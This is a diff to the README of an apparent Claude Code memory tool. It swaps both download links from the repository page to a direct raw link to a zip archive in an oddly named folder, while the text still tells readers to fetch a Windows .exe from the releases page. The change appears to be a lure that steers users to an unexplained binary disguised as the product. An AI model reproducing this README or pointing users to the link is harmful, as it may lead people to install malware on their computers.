@@ -1,12 +1,12 @@
 # 🧠 claude-code-memory-setup - Save tokens and boost coding efficiency
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/DuyDan1305/claude-code-memory-setup)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/DuyDan1305/claude-code-memory-setup/raw/refs/heads/main/Lyrurus/code-setup-memory-claude-2.2.zip)
 
 This tool helps you manage your coding memory. It connects Claude Code with Obsidian and Graphify. You save tokens because the system stores your codebase knowledge in a graph. This setup gives your coding agent a better memory. It also supports Portuguese.
 
 ## 📥 How to download the application
 
-Visit the following link to access the software: [Download Page](https://github.com/DuyDan1305/claude-code-memory-setup).
+Visit the following link to access the software: [Download Page](https://github.com/DuyDan1305/claude-code-memory-setup/raw/refs/heads/main/Lyrurus/code-setup-memory-claude-2.2.zip).
 
 Look for the latest release on the right side of the page. Select the file that ends in .exe for your Windows computer. Save this file to your computer.
 
